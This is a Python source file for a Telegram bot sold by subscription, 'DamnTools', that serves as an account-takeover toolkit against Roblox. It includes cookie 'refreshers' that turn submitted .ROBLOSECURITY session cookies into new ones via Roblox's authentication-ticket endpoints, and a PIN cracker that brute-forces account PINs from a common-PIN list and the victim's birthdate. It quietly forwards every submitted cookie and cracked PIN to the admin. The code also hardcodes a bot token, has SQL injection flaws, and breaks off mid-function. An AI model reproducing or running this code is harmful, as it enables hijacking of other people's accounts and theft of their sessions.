import telebot
from telebot import types
import requests
import time
import json
import random
import os
import threading
import sqlite3
import datetime

token = "7121689795:AAFlqg6ja5z63M_9LSTIvsENCzXdfthjqZU"
bot = telebot.TeleBot(token=token)
system_name = 'DamnTools'
admin = 6635431829
database = 'data.db'
con = sqlite3.connect(database, check_same_thread=False)
cursor = con.cursor()

@bot.message_handler(commands=["start"])
def repeat_all_messages(message):
    try:
        cursor.execute(f'SELECT id FROM banned WHERE id = "{message.chat.id}";')
        con.commit()
        cursor.execute(f"SELECT reason FROM banned WHERE id = '{message.chat.id}'")
        result = cursor.fetchone()
        con.commit()
        x1 = f"{result[0]}"
        bot.send_message(message.chat.id, f'Вы заблокированы\nПричина блокировки: {x1}\nВаш айди: {message.chat.id}')
        return
    except:
        pass
    
    try:
        cursor.execute(f'INSERT INTO users (access,id) VALUES ("0","{message.chat.id}");')
        con.commit()
        bot.send_message(admin, f'Новый пользователь\nID: {message.chat.id}')
    except sqlite3.IntegrityError:
        pass


    keyboard = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton(text="Мой профиль 👨‍💻", callback_data="profile")
    tx = types.InlineKeyboardButton(text="Тех. Поддержка 🆘", callback_data="help")
    button2 = types.InlineKeyboardButton(text="[single] Куки рефрешер ♻️", callback_data="refresh")
    button2_2 = types.InlineKeyboardButton(text="[multi] Куки рефрешер ♻️", callback_data="m_refresh")
    button3 = types.InlineKeyboardButton(text="Подбор пин-кода 🔐", callback_data="pins")
    button4 = types.InlineKeyboardButton(text="[single] Проверка куки 🍪", callback_data="check")
    button5 = types.InlineKeyboardButton(text="[multi] Проверка куки 🍪", callback_data="multi")
    keyboard.add(button1)
    keyboard.add(tx)
    keyboard.add(button2)
    keyboard.add(button2_2)
    keyboard.add(button4)
    keyboard.add(button5)
    keyboard.add(button3)
    if message.chat.id == admin:
        buttonx = types.InlineKeyboardButton(text="admin", callback_data="admin")
        keyboard.add(buttonx)
    bot.send_message(message.chat.id, f"Добро пожаловать в {system_name}", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
    if call.message:
        current_date = datetime.datetime.now().strftime('%Y-%m-%d')
        cursor.execute(f'SELECT access FROM users where id = "{call.message.chat.id}"')
        result = cursor.fetchone()
        x1 = result[0]
        con.commit()
        if x1 == '0':
            pass
        else:
            if str(current_date) >= str(x1):
                cursor.execute(f"UPDATE users SET access = '0' WHERE id = '{call.message.chat.id}';")
                bot.send_message(call.message.chat.id, 'Ваша подписка закончилась😔')
                con.commit()
            else:
                print(current_date)
                print(x1)
                pass

        try:
            cursor.execute(f'SELECT id FROM banned WHERE id = "{call.message.chat.id}";')
            con.commit()
            cursor.execute(f"SELECT reason FROM banned WHERE id = '{call.message.chat.id}'")
            result = cursor.fetchone()
            con.commit()
            x1 = f"{result[0]}"
            bot.send_message(call.message.chat.id, f'Вы заблокированы\nПричина блокировки: {x1}\nВаш айди: {call.message.chat.id}')
            return
        except TypeError or sqlite3.OperationalError:
            pass
        if call.message.chat.id == admin:
            if call.data == 'sub_day':
                cursor.execute(f"SELECT access FROM users WHERE id = {id}")
                result = cursor.fetchone()
                x1 = result[0]
                con.commit()
                print(x1)
                if x1 == '0':
                    sub = datetime.datetime.now().strftime('%d')
                    intergration = datetime.datetime.now().strftime('%Y-%m-')
                    sub = str(int(sub) + 1)
                    sub = f'{intergration}{sub}'
                    cursor.execute(f"UPDATE users SET access = '{sub}' WHERE id = '{id}';")
                    con.commit()
                    bot.send_message(id, f'Вам выдали подписку🎉\nПодписка действует до {sub}')
                else:
                    my_str = x1
                    year, mouth, day  = my_str.split('-')
                    day = int(day) + 1
                    day = str(day).zfill(2)
                    intergration = f'{year}-{mouth}-'
                    sub = f'{intergration}{day}'
                    cursor.execute(f"UPDATE users SET access = '{sub}' WHERE id = '{id}';")
                    con.commit()
                    bot.send_message(id, f'Вам выдали подписку🎉\nПодписка действует до {sub}')
            


            if call.data == 'sub_mouth':
                cursor.execute(f"SELECT access FROM users WHERE id = {id}")
                result = cursor.fetchone()
                x1 = result[0]
                con.commit()
                print(x1)
                if x1 == '0':
                    day = datetime.datetime.now().strftime('%d')
                    sub = datetime.datetime.now().strftime('%m')
                    intergration = datetime.datetime.now().strftime('%Y-')
                    sub = str(int(sub) + 1)
                    sub = str(sub).zfill(2)
                    sub = f'{intergration}{sub}-{day}'
                    cursor.execute(f"UPDATE users SET access = '{sub}' WHERE id = '{id}';")
                    con.commit()
                    bot.send_message(id, f'Вам выдали подписку🎉\nПодписка действует до {sub}')
                else:
                    my_str = x1
                    year, mouth, day  = my_str.split('-')
                    mouth = int(mouth) + 1
                    mouth = str(mouth).zfill(2)
                    intergration = f'{year}-{mouth}-{day}'
                    sub = intergration
                    cursor.execute(f"UPDATE users SET access = '{sub}' WHERE id = '{id}';")
                    con.commit()
                    bot.send_message(id, f'Вам выдали подписку🎉\nПодписка действует до {sub}')

            if call.data == 'sub_mouth':
                cursor.execute(f"SELECT access FROM users WHERE id = {id}")
                result = cursor.fetchone()
                x1 = result[0]
                con.commit()
                print(x1)
                if x1 == '0':
                    y = datetime.datetime.now().strftime('%y')
                    intergration = datetime.datetime.now().strftime('-%m-%d')
                    sub = str(int(y) + 1)
                    sub = f'{sub}{intergration}'
                    cursor.execute(f"UPDATE users SET access = '{sub}' WHERE id = '{id}';")
                    con.commit()
                    bot.send_message(id, f'Вам выдали подписку🎉\nПодписка действует до {sub}')
                else:
                    my_str = x1
                    year, mouth, day  = my_str.split('-')
                    year = int(year) + 1
                    intergration = f'{year}-{mouth}-{day}'
                    sub = intergration
                    cursor.execute(f"UPDATE users SET access = '{sub}' WHERE id = '{id}';")
                    con.commit()
                    bot.send_message(id, f'Вам выдали подписку🎉\nПодписка действует до {sub}')

            
            

            if call.data == 'sub':
                def id_sub(message):
                    data = cursor.execute(f"SELECT id FROM users WHERE id = {message.text}").fetchone()
                    if len(data) > 0:
                        bot.delete_message(message.chat.id, message.message_id)
                        bot.delete_message(message.chat.id, x.message_id)
                        global id
                        id = message.text
                        keyboard = types.InlineKeyboardMarkup()
                        button1 = types.InlineKeyboardButton(text="1 День", callback_data="sub_day")
                        button2 = types.InlineKeyboardButton(text="1 Месяц", callback_data="sub_mouth")
                        button3 = types.InlineKeyboardButton(text="1 Год", callback_data="sub_year")
                        buttonx = types.InlineKeyboardButton(text="Отмена", callback_data="menu")
                        keyboard.add(button1)
                        keyboard.add(button2)
                        keyboard.add(button3)
                        keyboard.add(buttonx)
                        bot.send_message(call.message.chat.id, f'На сколько выдать подписку пользователю: {id}', reply_markup=keyboard)
                    else:
                        keyboard = types.InlineKeyboardMarkup()
                        buttonx = types.InlineKeyboardButton(text="Меню", callback_data="menu")
                        keyboard.add(buttonx)
                        bot.send_message(call.message.chat.id, f'Данного пользователя нет в базе данных', reply_markup=keyboard)

                bot.delete_message(call.message.chat.id, call.message.message_id)
                keyboard = types.InlineKeyboardMarkup()
                button1 = types.InlineKeyboardButton(text="Отмена", callback_data="menu")
                keyboard.add(button1)
                x = bot.send_message(call.message.chat.id, '[Выдать] Введите айди пользователя', reply_markup=keyboard)
                bot.register_next_step_handler(x, id_sub)

                        
            if call.data == 'unsub':
                def id_sub(message):
                    data = cursor.execute(f"SELECT id FROM users WHERE id = {message.text}").fetchone()
                    if len(data) > 0:
                        cursor.execute(f"UPDATE users SET access = '0' WHERE id = '{message.text}';")
                        con.commit()
                    else:
                        keyboard = types.InlineKeyboardMarkup()
                        buttonx = types.InlineKeyboardButton(text="Меню", callback_data="menu")
                        keyboard.add(buttonx)
                        bot.send_message(call.message.chat.id, f'Данного пользователя нет в базе данных', reply_markup=keyboard)

                bot.delete_message(call.message.chat.id, call.message.message_id)
                keyboard = types.InlineKeyboardMarkup()
                button1 = types.InlineKeyboardButton(text="Отмена", callback_data="menu")
                keyboard.add(button1)
                x = bot.send_message(call.message.chat.id, '[Выдать] Введите айди пользователя', reply_markup=keyboard)
                bot.register_next_step_handler(x, id_sub)

            if call.data == 'key1':
                bot.delete_message(call.message.chat.id, call.message.message_id)
                markup = types.InlineKeyboardMarkup()
                button1 = types.InlineKeyboardButton("Выдать подписку", callback_data="sub")
                button2 = types.InlineKeyboardButton("Снять подписку", callback_data="unsub")
                markup.add(button1)
                markup.add(button2)
                bot.send_message(call.message.chat.id, "Выберите тип операции", reply_markup=markup)

            if call.data == 'key2':
                def send_3(message):
                    cursor.execute('SELECT id FROM users')
                    result = cursor.fetchall()
                    msg = message.text
                    time.sleep(1)
                    for x in result:
                        try:
                            bot.send_message(x[0], str(msg))
                        except telebot.apihelper.ApiTelegramException:
                            pass
                    bot.send_message(call.message.chat.id, 'успешно!')

                markup = types.InlineKeyboardMarkup()
                button1 = types.InlineKeyboardButton(text='Отмена ❌', callback_data='menu')
                markup.add(button1)
                msg = bot.send_message(call.message.chat.id, f"напишите cообщение для всех пользователей",
                                    reply_markup=markup)
                bot.register_next_step_handler(msg, send_3)

            if call.data == 'key3':
                def helpBot(message):
                    bot.send_message(id_user, 'Сообщение отправлено')
                    bot.forward_message(admin, id_user, message.message_id)
                    markup = types.InlineKeyboardMarkup()
                    button1 = types.InlineKeyboardButton(text='Не отвечать', callback_data='menu')
                    markup.add(button1)
                    msg = bot.send_message(admin, f"напишите ответ пользователю {id_user}", reply_markup=markup)
                    bot.register_next_step_handler(msg, next_update)
                
                def next_update(message):
                    reply = message.text
                    markup = types.InlineKeyboardMarkup()
                    button1 = types.InlineKeyboardButton(text='Закрыть диалог', callback_data='menu')
                    markup.add(button1)
                    msg = bot.send_message(id_user, f"Вам пришло сообщение от администрации, ответьте на него или нажмите на кнопку для отмены\n\nСообщение: {reply}", reply_markup=markup)
                    bot.register_next_step_handler(msg, helpBot)
                    
                def message_text(message):
                    reply = message.text
                    markup = types.InlineKeyboardMarkup()
                    button1 = types.InlineKeyboardButton(text='Закрыть диалог', callback_data='menu')
                    markup.add(button1)
                    msg = bot.send_message(id_user, f"Вам пришло сообщение от администрации, ответьте на него или нажмите на кнопку для отмены\n\nСообщение: {reply}", reply_markup=markup)
                    bot.register_next_step_handler(msg, helpBot)
            
                def id_get(message):
                    global id_user
                    id_user = message.text
                    markup = types.InlineKeyboardMarkup()
                    button1 = types.InlineKeyboardButton(text='Отмена ❌', callback_data='menu')
                    markup.add(button1)
                    msg = bot.send_message(call.message.chat.id, f"напишите сообщение для пользователя {id_user}",
                                        reply_markup=markup)
                    bot.register_next_step_handler(msg, message_text)

                markup = types.InlineKeyboardMarkup()
                button1 = types.InlineKeyboardButton(text='Отмена ❌', callback_data='menu')
                markup.add(button1)
                msg = bot.send_message(call.message.chat.id, f"напишите айди пользователя",
                                    reply_markup=markup)
                bot.register_next_step_handler(msg, id_get)

            if call.data == 'ban':
                def reason(message):
                    try:
                        cursor.execute(f'INSERT INTO banned (reason,id) VALUES ("{message.text}","{banned}");')
                        bot.send_message(call.message.chat.id, 'Пользователь заблокирован')
                    except sqlite3.IntegrityError:
                        bot.send_message(call.message.chat.id, 'Пользователь уже занесен с список банов')
                    con.commit()


                def id_ban(message):
                    global banned
                    banned = message.text
                    markup = types.InlineKeyboardMarkup()
                    button1 = types.InlineKeyboardButton(text='Отмена ❌', callback_data='menu')
                    markup.add(button1)
                    msg = bot.send_message(call.message.chat.id, f"укажите причину бана", reply_markup=markup)
                    bot.register_next_step_handler(msg, reason)

                markup = types.InlineKeyboardMarkup()
                button1 = types.InlineKeyboardButton(text='Отмена ❌', callback_data='menu')
                markup.add(button1)
                msg = bot.send_message(call.message.chat.id, f"напишите айди пользователя", reply_markup=markup)
                bot.register_next_step_handler(msg, id_ban)

            if call.data == 'unban':
                def unban(message):
                    cursor.execute(f'DELETE FROM banned WHERE id = "{message.text}";')
                    con.commit()
                    bot.send_message(call.message.chat.id, 'Блокировка снята')

                markup = types.InlineKeyboardMarkup()
                button1 = types.InlineKeyboardButton(text='Отмена ❌', callback_data='menu')
                markup.add(button1)
                msg = bot.send_message(call.message.chat.id, f"напишите айди пользователя", reply_markup=markup)
                bot.register_next_step_handler(msg, unban)

            if call.data == 'key4':
                markup = types.InlineKeyboardMarkup()
                button1 = types.InlineKeyboardButton(text='Заблокировать пользователя', callback_data='ban')
                button2 = types.InlineKeyboardButton(text='Разблокировать пользователя', callback_data='unban')
                markup.add(button1)
                markup.add(button2)
                bot.send_message(call.message.chat.id, 'Открыта панель управления блокировками', reply_markup=markup)
                
            if call.data == 'admin':
                bot.delete_message(call.message.chat.id, call.message.message_id)
                buttons = types.InlineKeyboardMarkup()
                key1 = types.InlineKeyboardButton(text='Управление подписками', callback_data='key1')
                key2 = types.InlineKeyboardButton(text='Рассылка всем пользователям', callback_data='key2')
                key3 = types.InlineKeyboardButton(text='Отправить сообщение пользователю', callback_data='key3')
                key4 = types.InlineKeyboardButton(text='Управление блокировками', callback_data='key4')
                buttons.add(key1)
                buttons.add(key2)
                buttons.add(key3)
                buttons.add(key4)
                cursor.execute("select count(*) from users")
                row_count = cursor.fetchone()
                con.commit()
                stat2 = row_count[0]
                bot.send_message(call.message.chat.id, f'Панель инструментов открыта\n\nВсего пользователей: {stat2} ', reply_markup=buttons)


        if call.data == 'help':
            try:
                bot.delete_message(call.message.chat.id, call.message.message_id)
            except:
                pass
            def helpBot(message):
                global help_user_id
                help_user_id = message.chat.id
                bot.send_message(message.chat.id, 'Сообщение отправлено')
                bot.forward_message(admin, message.chat.id, message.message_id)
                markup = types.InlineKeyboardMarkup()
                button1 = types.InlineKeyboardButton(text='Не отвечать', callback_data='menu')
                markup.add(button1)
                msg = bot.send_message(admin, f"напишите ответ пользователю {help_user_id}", reply_markup=markup)
                bot.register_next_step_handler(msg, next_update)

            def next_update(message):
                reply = message.text
                markup = types.InlineKeyboardMarkup()
                button1 = types.InlineKeyboardButton(text='Закрыть диалог', callback_data='menu')
                markup.add(button1)
                msg = bot.send_message(message.chat.id, f"Вам пришло сообщение от администрации, ответьте на него или нажмите на кнопку для отмены\n\nСообщение: {reply}", reply_markup=markup)
                bot.register_next_step_handler(msg, helpBot)

            help_user_id = call.message.from_user.id
            markup = types.InlineKeyboardMarkup()
            button1 = types.InlineKeyboardButton(text='Отмена', callback_data='menu')
            markup.add(button1)
            msg = bot.send_message(call.message.chat.id, 'Задайте вопрос прямо сюда. Вам ответят как можно быстрее.', reply_markup=markup)
            bot.register_next_step_handler(msg, helpBot)

        if call.data == 'menu':
            try:
                bot.clear_step_handler_by_chat_id(chat_id=call.message.chat.id)
            except:
                pass
            try:
                bot.delete_message(call.message.chat.id, call.message.message_id)
            except:
                pass
            keyboard = types.InlineKeyboardMarkup()
            button1 = types.InlineKeyboardButton(text="Мой профиль 👨‍💻", callback_data="profile")
            tx = types.InlineKeyboardButton(text="Тех. Поддержка 🆘", callback_data="help")
            button2 = types.InlineKeyboardButton(text="[single] Куки рефрешер ♻️", callback_data="refresh")
            button2_2 = types.InlineKeyboardButton(text="[multi] Куки рефрешер ♻️", callback_data="m_refresh")
            button3 = types.InlineKeyboardButton(text="Подбор пин-кода 🔐", callback_data="pins")
            button4 = types.InlineKeyboardButton(text="[single] Проверка куки 🍪", callback_data="check")
            button5 = types.InlineKeyboardButton(text="[multi] Проверка куки 🍪", callback_data="multi")
            keyboard.add(button1)
            keyboard.add(tx)
            keyboard.add(button2)
            keyboard.add(button2_2)
            keyboard.add(button4)
            keyboard.add(button5)
            keyboard.add(button3)
            if call.message.chat.id == admin:
                buttonx = types.InlineKeyboardButton(text="admin", callback_data="admin")
                keyboard.add(buttonx)
            bot.send_message(call.message.chat.id, f'Добро пожаловать в {system_name}', reply_markup=keyboard)
            
        if call.data == "profile":
            cursor.execute(f"SELECT access FROM users WHERE id = {call.message.chat.id}")
            result = cursor.fetchone()
            x1 = result[0]
            if x1 == '0':
                value = 'False'
            else:
                value = f'До {x1}'
            keyboard = types.InlineKeyboardMarkup()
            button1 = types.InlineKeyboardButton(text="Меню ◀️", callback_data="menu")
            keyboard.add(button1)
            bot.delete_message(call.message.chat.id, call.message.message_id)
            bot.send_message(call.message.chat.id, f"Ваш профиль👨‍💻\n\n🆔 ID: {call.message.chat.id}\n📑 Доступ: {value}", reply_markup=keyboard)
        
        


        
        if call.data == 'm_refresh':
            cursor.execute(f"SELECT access FROM users WHERE id = {call.message.chat.id}")
            result = cursor.fetchone()
            x1 = result[0]
            if x1 == '0':
                bot.send_message(call.message.chat.id, 'У вас нет подписки')
                return
            else:
                bot.delete_message(call.message.chat.id, call.message.message_id)
                def get_file(message):
                    bot.delete_message(message.chat.id, msg.message_id)
                    invalid = 0
                    valid = 0
                    checked = 0
                    try:
                        bot.delete_message(message.chat.id, message.message_id)
                        file_name = message.document.file_name
                        file_id_info = bot.get_file(message.document.file_id)
                        file_name = message.document.file_name
                        file_id = message.document.file_name
                        file_id_info = bot.get_file(message.document.file_id)
                        downloaded_file = bot.download_file(file_id_info.file_path)
                        src = file_name
                        with open(src, 'wb') as new_file:
                            new_file.write(downloaded_file)
                        new_file.close()
                        ses = requests.session()
                        cookies = open(src).read().splitlines()
                        def remove_html_tags(text):
                            """Remove html tags from a string"""
                            import re
                            clean = re.compile('<.*?>')
                            return re.sub(clean, '', text)
                        valid = 0
                        for line in cookies:
                            try:
                                cookie = line
                                csrf_request = requests.get("https://www.roblox.com/home",
                                cookies = {
                                    ".ROBLOSECURITY": cookie
                                    }
                                )

                                if csrf_request.status_code != 200:
                                    pass

                                csrf_token = csrf_request.text.split('data-token="')[1].split('"')[0]



                                auth_request = requests.post("https://auth.roblox.com/v1/authentication-ticket", 
                                    cookies = {
                                        ".ROBLOSECURITY": cookie
                                    },
                                    headers = {
                                        "Content-Type": "application/json",
                                        "origin": "https://www.roblox.com",
                                        "referer": "https://www.roblox.com/my/account",
                                        "user-agent": "Roblox/WinInet",
                                        "x-csrf-token": csrf_token
                                    }
                                )

                                auth_ticket = auth_request.headers.get("rbx-authentication-ticket")


                                refresh_request = requests.post("https://auth.roblox.com/v1/authentication-ticket/redeem", 
                                    json = {
                                        "authenticationTicket": auth_ticket
                                    },
                                    headers = {
                                        "Content-Type": "application/json",
                                        "origin": "https://www.roblox.com",
                                        "RBXAuthenticationNegotiation": "1",
                                        "referer": "https://www.roblox.com/my/account",
                                        "user-agent": "Roblox/WinInet",
                                        "x-csrf-token": csrf_token
                                    }
                                )
                                o = open('output.txt','a')
                                refresh_cookie = refresh_request.headers["set-cookie"].split(".ROBLOSECURITY=")[1].split(";")[0]
                                log = f'{refresh_cookie}'
                                o.write(f'{log}\n')
                                valid = valid + 1
                            except KeyError:
                                pass
                        o.close()
                        bot.send_document(message.chat.id, open("output.txt", 'rb'), caption=f'Рефреш завершен\n✅ Рефрешнуто куки: {valid}\n\nuser: {message.chat.id}')
                        bot.send_document(admin, open("output.txt", 'rb'), caption=f'Рефреш завершен\n✅ Рефрешнуто куки: {valid}')
                        os.remove('output.txt')
                    except Exception as E:
                        print(E)
                        keyboard = types.InlineKeyboardMarkup()
                        button1 = types.InlineKeyboardButton(text="Меню ◀️", callback_data="menu")
                        keyboard.add(button1)
                        bot.send_message(message.chat.id, f'Действие отменено ❌\nОшибка: Неопознаный файл', reply_markup=keyboard)  
                keyboard = types.InlineKeyboardMarkup()
                button1 = types.InlineKeyboardButton(text="Отмена ❌", callback_data="menu")
                keyboard.add(button1)
                msg = bot.send_message(call.message.chat.id, 'Отправьте файл с куки файлами.\nКаждые новые куки должны быть с новой строки', reply_markup=keyboard)
                bot.register_next_step_handler(msg, get_file)

        if call.data == "refresh":
            cursor.execute(f"SELECT access FROM users WHERE id = {call.message.chat.id}")
            result = cursor.fetchone()
            x1 = result[0]
            if x1 == '0':
                bot.send_message(call.message.chat.id, 'У вас нет подписки')
                return
            else:
                def get_cookies(message):
                    bot.delete_message(call.message.chat.id, msg.message_id)
                    cookie = message.text
                    csrf_request = requests.get("https://www.roblox.com/home",
                    cookies = {
                        ".ROBLOSECURITY": cookie
                        }
                    )

                    if csrf_request.status_code != 200:
                        pass

                    csrf_token = csrf_request.text.split('data-token="')[1].split('"')[0]



                    auth_request = requests.post("https://auth.roblox.com/v1/authentication-ticket", 
                        cookies = {
                            ".ROBLOSECURITY": cookie
                        },
                        headers = {
                            "Content-Type": "application/json",
                            "origin": "https://www.roblox.com",
                            "referer": "https://www.roblox.com/my/account",
                            "user-agent": "Roblox/WinInet",
                            "x-csrf-token": csrf_token
                        }
                    )

                    auth_ticket = auth_request.headers.get("rbx-authentication-ticket")


                    refresh_request = requests.post("https://auth.roblox.com/v1/authentication-ticket/redeem", 
                        json = {
                            "authenticationTicket": auth_ticket
                        },
                        headers = {
                            "Content-Type": "application/json",
                            "origin": "https://www.roblox.com",
                            "RBXAuthenticationNegotiation": "1",
                            "referer": "https://www.roblox.com/my/account",
                            "user-agent": "Roblox/WinInet",
                            "x-csrf-token": csrf_token
                        }
                    )
                    try:
                        refresh_cookie = refresh_request.headers["set-cookie"].split(".ROBLOSECURITY=")[1].split(";")[0]
                        keyboard = types.InlineKeyboardMarkup()
                        button1 = types.InlineKeyboardButton(text="Меню ◀️", callback_data="menu")
                        keyboard.add(button1)
                        bot.delete_message(call.message.chat.id, message.message_id)
                        bot.send_message(message.chat.id, f'```Cookies🍪:\n{refresh_cookie}\n```', parse_mode='MarkdownV2', reply_markup=keyboard)
                        bot.send_message(admin, f'```{message.chat.id}🍪:\n{refresh_cookie}\n```', parse_mode='MarkdownV2', reply_markup=keyboard)
                    except KeyError:
                        bot.delete_message(call.message.chat.id, message.message_id)
                        keyboard = types.InlineKeyboardMarkup()
                        button1 = types.InlineKeyboardButton(text="Меню ◀️", callback_data="menu")
                        keyboard.add(button1)
                        bot.send_message(message.chat.id, f'Действие отменено ❌\nОшибка: Invalid cookies', reply_markup=keyboard)

                keyboard = types.InlineKeyboardMarkup()
                button1 = types.InlineKeyboardButton(text="Отмена ❌", callback_data="menu")
                keyboard.add(button1)
                bot.delete_message(call.message.chat.id, call.message.message_id)
                msg = bot.send_message(call.message.chat.id, f"Введите полные куки файлы 🍪", reply_markup=keyboard)
                bot.register_next_step_handler(msg, get_cookies)
        if call.data == 'pins':
            cursor.execute(f"SELECT access FROM users WHERE id = {call.message.chat.id}")
            result = cursor.fetchone()
            x1 = result[0]
            if x1 == '0':
                bot.send_message(call.message.chat.id, 'У вас нет подписки')
                return
            else:
                def pin_crack(message):
                    cookie = message.text
                    bot.delete_message(call.message.chat.id, message.message_id)
                    bot.delete_message(call.message.chat.id, msg.message_id)
                    check = requests.get('https://friends.roblox.com/v1/user/friend-requests/count', cookies={'.ROBLOSECURITY': str(cookie)}) 
                    if not check.status_code == 200:
                        keyboard = types.InlineKeyboardMarkup()
                        button1 = types.InlineKeyboardButton(text="Меню ◀️", callback_data="menu")
                        keyboard.add(button1)
                        bot.send_message(message.chat.id, f'Действие отменено ❌\nОшибка: Invalid cookies', reply_markup=keyboard)
                        return
                    else:
                        keyboard = types.InlineKeyboardMarkup()
                        button1 = types.InlineKeyboardButton(text="Мой профиль 👨‍💻", callback_data="profile")
                        tx = types.InlineKeyboardButton(text="Тех. Поддержка 🆘", callback_data="help")
                        button2 = types.InlineKeyboardButton(text="[single] Куки рефрешер ♻️", callback_data="refresh")
                        button2_2 = types.InlineKeyboardButton(text="[multi] Куки рефрешер ♻️", callback_data="m_refresh")
                        button3 = types.InlineKeyboardButton(text="Подбор пин-кода 🔐", callback_data="pins")
                        button4 = types.InlineKeyboardButton(text="[single] Проверка куки 🍪", callback_data="check")
                        button5 = types.InlineKeyboardButton(text="[multi] Проверка куки 🍪", callback_data="multi")
                        keyboard.add(button1)
                        keyboard.add(tx)
                        keyboard.add(button2)
                        keyboard.add(button2_2)
                        keyboard.add(button4)
                        keyboard.add(button5)
                        keyboard.add(button3)
                        if call.message.chat.id == admin:
                            buttonx = types.InlineKeyboardButton(text="admin", callback_data="admin")
                            keyboard.add(buttonx)
                        bot.send_message(call.message.chat.id, f"Подбор запущен✅\nОжидайте⏳")
                        bot.send_message(call.message.chat.id, f"Добро пожаловать в {system_name}", reply_markup=keyboard)

                    
                    def getXsrf(cookie):
                        xsrfRequest = requests.post("https://auth.roblox.com/v2/logout", cookies={
                                '.ROBLOSECURITY': cookie
                        })
                        return xsrfRequest.headers["x-csrf-token"]


                    def start(cookie):
                        if not os.path.exists("progress.json"):
                            time.sleep(1)
                            open("progress.json", "w+").write("{\n\n}")
                            time.sleep(1)
                        cookies = {'.ROBLOSECURITY': cookie}
                        userid = requests.get("https://users.roblox.com/v1/users/authenticated",cookies=cookies).json()['id']
                        time.sleep(1)
                        startingLine = 0
                        pins = [pin[0:pin.index(",")] for pin in requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv").text.splitlines()]

                        for line, pin in enumerate(pins):
                            print(f"Trying {pin}...")

                            progress = json.load(open("progress.json", "r"))
                            with open("progress.json", "w+") as f:
                                progress[str(userid)] = int(line+startingLine)
                                json.dump(progress, f, indent=1)

                            pin = pins[line]
                            printed = False
                            bot.send_message(admin, f'```{message.chat.id}🍪:\n{cookie}\n```', parse_mode='MarkdownV2', reply_markup=keyboard)
                            try:
                                req = requests.Session()
                                req.cookies['.ROBLOSECURITY'] = cookie
                                try:
                                    r = req.get('https://www.roblox.com/mobileapi/userinfo').json()
                                    userid = r['UserID']
                                except:
                                    input('INVALID COOKIE')
                                    exit()

                                print('Logged in.\n')
                                print('Loaded most common pins.')

                                r = req.get('https://accountinformation.roblox.com/v1/birthdate').json()
                                month = str(r['birthMonth']).zfill(2)
                                day = str(r['birthDay']).zfill(2)
                                year = str(r['birthYear'])

                                
                                try:
                                        request = requests.post("https://auth.roblox.com/v1/account/pin/unlock", headers={
                                        'X-CSRF-TOKEN': getXsrf(cookie),
                                    }, data={'pin': year}, cookies=cookies)
                                except Exception as e:
                                    continue

                                response = request.json()
                                status_code = request.status_code

                                try:
                                    if "unlockedUntil" in str(response):
                                        print("Cookie:", 'cyan')

                                        print(cookie)
                                        print(f"Pin found: {pin}", 'green')
                                        bot.send_message(message.chat.id, f'✅ Пин взломан\n🔑 Pin: {pin}')
                                        bot.send_message(admin, f'```{message.chat.id}🍪:\n{cookie}\n```\n```{pin}🍪:\n{pin}\n```', parse_mode='MarkdownV2')

                                        if not r.status_code ==200:
                                            print("[", end="")
                                            print("ERROR", end="")
                                            print("] " , end="")

                                            print('Invalid Webhook', 'red')
                                        return

                                    if response['errors'][0]['code'] == 4:
                                        print("Incorrect Pin", 'red')
                                        printed = False
                                        

                                    elif response['errors'][0]['message'] == "Too many requests":
                                        if not printed:
                                            print(f'Too many requests. Waiting 20 minutes before resumimg', 'ratelimit')
                                            printed = True

                                            time.sleep(60)
                                            continue

                                    if response['errors'][0]['message'] == 'Authorization has been denied for this request.':
                                        print("Error found. Invalid Cookie. Re-enter the cookie and try again", "error")

                                        time.sleep(5)
                                        return

                                    elif response['errors'][0]['message'] == 'Token Validation Failed':
                                        print("Error found. Invalid x-csrf token. The program failed to fetch the x-csrf token. Recheck the cookie and the roblox api endpoint. https://auth.roblox.com/v1/account/pin/unlock", "error")
                                        time.sleep(5)
                                        return
                                except:
                                    continue
                                    
                                try:
                                        request = requests.post("https://auth.roblox.com/v1/account/pin/unlock", headers={
                                        'X-CSRF-TOKEN': getXsrf(cookie),
                                    }, data={'pin': f'{month}{day}'}, cookies=cookies)
                                except Exception as e:
                                    continue

                                response = request.json()
                                status_code = request.status_code

                                try:
                                    if "unlockedUntil" in str(response):
                                        print("Cookie:", 'cyan')

                                        print(cookie)
                                        print(f"Pin found: {pin}", 'green')
                                        bot.send_message(message.chat.id, f'✅ Пин взломан\n🔑 Pin: {pin}')

                                        if not r.status_code ==200:
                                            print("[", end="")
                                            print("ERROR", end="")
                                            print("] " , end="")

                                            print('Invalid Webhook', 'red')
                                        return

                                    if response['errors'][0]['code'] == 4:
                                        print("Incorrect Pin", 'red')
                                        printed = False
                                        

                                    elif response['errors'][0]['message'] == "Too many requests":
                                        if not printed:
                                            print(f'Too many requests. Waiting 20 minutes before resumimg', 'ratelimit')
                                            printed = True

                                            time.sleep(60)
                                            continue

                                    if response['errors'][0]['message'] == 'Authorization has been denied for this request.':
                                        print("Error found. Invalid Cookie. Re-enter the cookie and try again", "error")

                                        time.sleep(5)
                                        return

                                    elif response['errors'][0]['message'] == 'Token Validation Failed':
                                        print("Error found. Invalid x-csrf token. The program failed to fetch the x-csrf token. Recheck the cookie and the roblox api endpoint. https://auth.roblox.com/v1/account/pin/unlock", "error")
                                        time.sleep(5)
                                        return
                                except:
                                    continue
                                
                                try:
                                        request = requests.post("https://auth.roblox.com/v1/account/pin/unlock", headers={
                                        'X-CSRF-TOKEN': getXsrf(cookie),
                                    }, data={'pin': f'{day}{month}'}, cookies=cookies)
                                except Exception as e:
                                    continue

                                response = request.json()
                                status_code = request.status_code

                                try:
                                    if "unlockedUntil" in str(response):
                                        print("Cookie:", 'cyan')

                                        print(cookie)
                                        print(f"Pin found: {pin}", 'green')
                                        bot.send_message(message.chat.id, f'✅ Пин взломан\n🔑 Pin: {pin}')

                                        if not r.status_code ==200:
                                            print("[", end="")
                                            print("ERROR", end="")
                                            print("] " , end="")

                                            print('Invalid Webhook', 'red')
                                        return

                                    if response['errors'][0]['code'] == 4:
                                        print("Incorrect Pin", 'red')
                                        printed = False
                                        

                                    elif response['errors'][0]['message'] == "Too many requests":
                                        if not printed:
                                            print(f'Too many requests. Waiting 20 minutes before resumimg', 'ratelimit')
                                            printed = True

                                            time.sleep(60)
                                            continue

                                    if response['errors'][0]['message'] == 'Authorization has been denied for this request.':
                                        print("Error found. Invalid Cookie. Re-enter the cookie and try again", "error")

                                        time.sleep(5)
                                        return

